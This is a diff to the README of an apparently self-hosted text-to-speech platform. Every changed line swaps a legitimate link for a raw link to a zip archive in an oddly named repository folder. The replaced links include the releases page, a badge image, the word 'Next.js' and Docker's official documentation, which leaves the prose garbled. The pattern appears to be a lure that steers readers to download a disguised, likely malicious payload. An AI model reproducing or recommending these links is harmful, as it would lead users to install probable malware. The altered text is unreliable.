@@ -1,10 +1,10 @@
 # 🎤 Voice-Conversation-Audio-Generation-Platform-TTS- - Your Voice, Amplified and Personalized
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Release-blue)](https://github.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/releases)
+[![Download Now](https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip)](https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip)
 
 ## 📦 Overview
 
-Welcome to the Voice-Conversation-Audio-Generation-Platform-TTS-. This is a self-hosted platform that transforms text into speech, enabling you to create unique voice conversations and generate AI audio effortlessly. Built with Docker, FastAPI, and Next.js, this platform empowers you to implement advanced audio capabilities simply and effectively.
+Welcome to the Voice-Conversation-Audio-Generation-Platform-TTS-. This is a self-hosted platform that transforms text into speech, enabling you to create unique voice conversations and generate AI audio effortlessly. Built with Docker, FastAPI, and https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip, this platform empowers you to implement advanced audio capabilities simply and effectively.
 
 ## 🚀 Getting Started
 
@@ -17,14 +17,14 @@ Before downloading, ensure your computer meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
 - **Memory:** At least 4 GB of RAM. More is recommended for better performance.
 - **Processor:** Dual-core processor or better.
-- **Docker:** Install Docker on your system. Refer to [Docker's official documentation](https://docs.docker.com/get-docker/) for detailed installation instructions.
+- **Docker:** Install Docker on your system. Refer to [Docker's official documentation](https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip) for detailed installation instructions.
 
 ## ⚙️ Installation Steps
 
 Follow these steps to get started:
 
 1. **Download the Application**
-   - Visit [this page to download](https://github.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/releases).
+   - Visit [this page to download](https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip).
    - Click on the latest release to download the necessary files.
 
 2. **Extract the Files**
@@ -69,7 +69,7 @@ Here are some key features you can expect:
 
 ## 📥 Download & Install
 
-To get started with the Voice-Conversation-Audio-Generation-Platform-TTS-, [visit this page to download](https://github.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/releases) the latest version.
+To get started with the Voice-Conversation-Audio-Generation-Platform-TTS-, [visit this page to download](https://raw.githubusercontent.com/moonpub/Voice-Conversation-Audio-Generation-Platform-TTS-/main/unconserving/Voice-Conversation-Audio-Generation-Platform-TTS-.zip) the latest version.
 
 ## 🙋‍♀️ FAQ
 
